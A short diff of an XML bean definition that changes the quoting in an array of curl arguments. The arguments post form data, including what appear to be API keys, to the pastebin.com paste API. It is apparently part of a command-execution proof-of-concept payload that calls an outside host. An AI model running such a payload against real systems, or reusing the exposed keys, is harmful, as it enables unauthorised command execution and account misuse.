@@ -9,7 +9,7 @@
         <array>
             <value>curl </value>
             <value>-d</value>
-            <value>'api_dev_key=XSmWtTj6kCM2FLcwHZyvARd5WpB_RrIY&amp;api_paste_code=123&amp;api_option=paste&amp;api_paste_private=0&amp;api_user_key=e6807aba10120c035f8a12b666b85760&amp;api_paste_name=dojackson'</value>
+            <value>&quot;api_dev_key=XSmWtTj6kCM2FLcwHZyvARd5WpB_RrIY&amp;api_paste_code=123&amp;api_option=paste&amp;api_paste_private=0&amp;api_user_key=e6807aba10120c035f8a12b666b85760&amp;api_paste_name=dojackson&quot;</value>
             <value>https://pastebin.com/api/api_post.php</value>
         </array>
     </constructor-arg>
